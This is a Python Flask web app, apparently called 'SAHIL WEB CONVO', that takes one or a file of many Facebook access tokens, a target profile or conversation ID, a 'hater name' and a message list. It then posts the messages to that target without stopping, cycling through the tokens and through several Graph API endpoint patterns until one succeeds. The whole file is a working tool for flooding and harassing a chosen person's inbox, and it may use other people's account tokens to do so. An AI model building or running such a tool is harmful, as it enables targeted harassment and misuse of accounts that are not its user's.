from flask import Flask, request, render_template_string, jsonify
import requests
from threading import Thread, Event
import time
import random
import string
from urllib.parse import urlparse, parse_qs

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}
message_counters = {}

def normalize_target_id(raw):
    """
    Input can be:
    - full profile URL like https://www.facebook.com/profile.php?id=61566973547685,
    - short URL like https://facebook.com/username
    - just numeric id '61566973547685'
    - other forms
    This function tries to extract a sensible id (prefer numeric id if present).
    Returns the extracted id string (or original raw if nothing extracted).
    """
    if not raw:
        return raw
    raw = raw.strip()
    # if looks like url
    if raw.startswith("http://") or raw.startswith("https://"):
        try:
            p = urlparse(raw)
            qs = parse_qs(p.query)
            if 'id' in qs and qs['id']:
                return qs['id'][0]
            # else try last path segment
            path = p.path.strip('/')
            if path:
                # if path like profile.php then fallback; else return last segment
                return path.split('/')[-1]
        except Exception:
            pass
    # if contains 'profile.php?id=' somewhere (not full url)
    if 'profile.php?id=' in raw:
        try:
            return raw.split('profile.php?id=')[-1].split('&')[0]
        except:
            pass
    # otherwise return raw (could be numeric or t_xxx or convo id)
    return raw

def build_candidate_endpoints(target_id):
    """
    Return a list of candidate Graph API endpoints (strings) to try for sending messages.
    We will try them in order until one returns HTTP 200.
    Note: Different setups require different endpoints; we try a few common patterns.
    """
    candidates = []
    if not target_id:
        return candidates
    # If target looks numeric, try common message endpoints
    # 1) direct messages endpoint pattern (messages)
    candidates.append(f'https://graph.facebook.com/v15.0/{target_id}/messages')
    # 2) older pattern used in some scripts (t_{id})
    candidates.append(f'https://graph.facebook.com/v15.0/t_{target_id}/')
    # 3) direct node endpoint (without /messages)
    candidates.append(f'https://graph.facebook.com/v15.0/{target_id}/')
    # 4) try convo prefix (some code expects t_<id>)
    if not str(target_id).startswith('t_'):
        candidates.append(f'https://graph.facebook.com/v15.0/t_{target_id}/messages')
        candidates.append(f'https://graph.facebook.com/v15.0/t_{target_id}/')
    # remove duplicates while preserving order
    seen = set()
    out = []
    for c in candidates:
        if c not in seen:
            seen.add(c)
            out.append(c)
    return out

def send_messages(access_tokens, thread_id_raw, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    message_counters[task_id] = 0

    # Normalize thread id (handle full URL -> numeric id or username)
    target_id = normalize_target_id(thread_id_raw)
    candidates = build_candidate_endpoints(target_id)

    # If no candidates, fallback to using raw as last resort
    if not candidates:
        candidates = [thread_id_raw]

    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                if stop_event.is_set():
                    break
                message = str(mn) + ' ' + message1

                # For each access_token we try the candidate endpoints until one succeeds
                sent = False
                for api_url in candidates:
                    if stop_event.is_set():
                        break
                    # Prepare parameters — many Graph endpoints accept 'message' and 'access_token'
                    parameters = {'access_token': access_token, 'message': message}
                    try:
                        # Try POST to candidate endpoint
                        response = requests.post(api_url, data=parameters, headers=headers, timeout=12)
                        status = getattr(response, "status_code", None)
                        # If Facebook returns 200 or 201 we count as success
                        if status and 200 <= status < 300:
                            message_counters[task_id] += 1
                            print(f"✅ Sent ({message_counters[task_id]}) via {api_url}: {message}")
                            sent = True
                            break
                        else:
                            # print debug info but don't spam for every attempt
                            print(f"❌ Endpoint {api_url} returned {status} for token... trying next. Response text: {getattr(response,'text', '')[:200]}")
                    except Exception as e:
                        print(f"Error posting to {api_url}: {e}")
                if not sent:
                    # Final fallback: try the original older pattern used in your code (t_{thread_id_raw})
                    try:
                        fallback_url = f'https://graph.facebook.com/v15.0/t_{thread_id_raw}/'
                        fallback_params = {'access_token': access_token, 'message': message}
                        r2 = requests.post(fallback_url, data=fallback_params, headers=headers, timeout=12)
                        if 200 <= getattr(r2,"status_code",0) < 300:
                            message_counters[task_id] += 1
                            print(f"✅ Sent fallback ({message_counters[task_id]}): {message}")
                        else:
                            print(f"❌ All endpoints failed for token. Last fallback status: {getattr(r2,'status_code',None)}")
                    except Exception as e:
                        print("Final fallback error:", e)

                # Respect delay between tokens/messages
                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')
        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        try:
            time_interval = int(request.form.get('time'))
        except:
            time_interval = 1

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))

        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return render_template_string(PAGE_HTML, task_id=task_id)

    return render_template_string(PAGE_HTML, task_id=None)

@app.route('/status/<task_id>')
def get_status(task_id):
    count = message_counters.get(task_id, 0)
    running = task_id in threads and not stop_events[task_id].is_set()
    return jsonify({'count': count, 'running': running})

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'

# (PAGE_HTML same as before — keep your UI unchanged)
PAGE_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>SAHIL NON-STOP SERVER</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    label { color: white; }
    body {
      background-image: url('https://i.ibb.co/2XxDZGX/7892676.png');
      background-size: cover;
      background-repeat: no-repeat;
      color: white;
      font-family: 'Poppins', sans-serif;
      min-height: 100vh;
    }
    .container {
      max-width: 350px;
      height: auto;
      border-radius: 20px;
      padding: 20px;
      background: rgba(0,0,0,0.5);
      box-shadow: 0 0 15px rgba(255,255,255,0.2);
      margin-top: 40px;
    }
    .form-control {
      border: 1px solid white;
      background: transparent;
      color: white;
      border-radius: 10px;
    }
    .form-control:focus {
      box-shadow: 0 0 10px white;
    }
    .btn-submit {
      width: 100%;
      margin-top: 10px;
      border-radius: 10px;
      background: #007bff;
      color: white;
      font-weight: bold;
    }
    .btn-submit:hover {
      background: #0056b3;
    }
    .header {
      text-align: center;
      padding-bottom: 20px;
      color: white;
    }
    .footer {
      text-align: center;
      margin-top: 20px;
      color: #ccc;
    }
    .whatsapp-link {
      display: inline-block;
      color: #25d366;
      text-decoration: none;
      margin-top: 10px;
    }
    .status-box {
      margin-top: 15px;
      background: rgba(0,0,0,0.6);
      border-radius: 10px;
      padding: 10px;
      color: cyan;
      text-align: center;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <header class="header mt-4">
    <h1>SAHIL WEB CONVO</h1>
  </header>
  <div class="container text-center">
    <form method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="tokenOption" class="form-label">Select Token Option</label>
        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
          <option value="single">Single Token</option>
          <option value="multiple">Token File</option>
        </select>
      </div>
      <div class="mb-3" id="singleTokenInput">
        <label>Enter Single Token</label>
        <input type="text" class="form-control" name="singleToken">
      </div>
      <div class="mb-3" id="tokenFileInput" style="display:none;">
        <label>Choose Token File</label>
        <input type="file" class="form-control" name="tokenFile">
      </div>
      <div class="mb-3">
        <label>Enter Inbox/convo uid or profile URL</label>
        <input type="text" class="form-control" name="threadId" required placeholder="e.g. https://www.facebook.com/profile.php?id=61564176744081">
      </div>
      <div class="mb-3">
        <label>Enter Your Hater Name</label>
        <input type="text" class="form-control" name="kidx" required>
      </div>
      <div class="mb-3">
        <label>Enter Time (seconds)</label>
        <input type="number" class="form-control" name="time" required>
      </div>
      <div class="mb-3">
        <label>Choose Your Np File</label>
        <input type="file" class="form-control" name="txtFile" required>
      </div>
      <button type="submit" class="btn btn-submit">Run</button>
    </form>

    {% if task_id %}
    <div class="status-box" id="statusBox">
      Task ID: <span style="color:white;">{{ task_id }}</span><br>
      Messages Sent: <span id="msgCount">0</span>
    </div>
    <script>
      const taskId = "{{ task_id }}";
      setInterval(() => {
        fetch(`/status/${taskId}`)
          .then(res => res.json())
          .then(data => {
            if (data.running) {
              document.getElementById('msgCount').innerText = data.count;
            } else {
              document.getElementById('statusBox').innerHTML = "✅ Task Completed!";
            }
          });
      }, 2000);
    </script>
    {% endif %}

    <form method="post" action="/stop" class="mt-3">
      <div class="mb-3">
        <label>Enter Task ID to Stop</label>
        <input type="text" class="form-control" name="taskId" required>
      </div>
      <button type="submit" class="btn btn-submit" style="background:red;">Stop</button>
    </form>
  </div>
  <footer class="footer">
    <p>SAHIL OFFLINE S3RV3R</p>
    <p>SAHIL ALWAYS ON FIRE </p>
    <div class="mb-3">
      <a href="https://wa.me/+918115048433" class="whatsapp-link">
        <i class="fab fa-whatsapp"></i> Chat on WhatsApp
      </a>
    </div>
  </footer>
  <script>
    function toggleTokenInput() {
      var tokenOption = document.getElementById('tokenOption').value;
      document.getElementById('singleTokenInput').style.display = tokenOption=='single'?'block':'none';
      document.getElementById('tokenFileInput').style.display = tokenOption=='multiple'?'block':'none';
    }
  </script>
</body>
</html>
'''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5040)
                
